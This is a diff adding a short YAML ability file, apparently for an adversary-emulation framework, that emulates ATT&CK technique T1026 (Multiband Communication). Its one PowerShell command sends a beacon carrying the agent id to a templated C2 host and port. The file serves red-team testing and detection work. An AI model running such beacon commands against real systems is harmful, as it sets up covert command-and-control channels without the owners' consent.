@@ -1,0 +1,14 @@
+- id: b2bef611-1551-4c18-a10c-4c6e77e79585
+  name: Multiband Communication
+  description: Ability for Multiband Communication (ATT&CK T1026). Generated from
+    Atomic Red Team procedures; review and test safely before use. [AUTO-INFERRED
+    SAFE STUB]
+  tactic: command-and-control
+  technique:
+    attack_id: T1026
+    name: Multiband Communication
+  platforms:
+    windows:
+      psh:
+        command: powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing
+          http://#{c2_host}:#{c2_port}/beacon?id=#{paw} -Method GET"
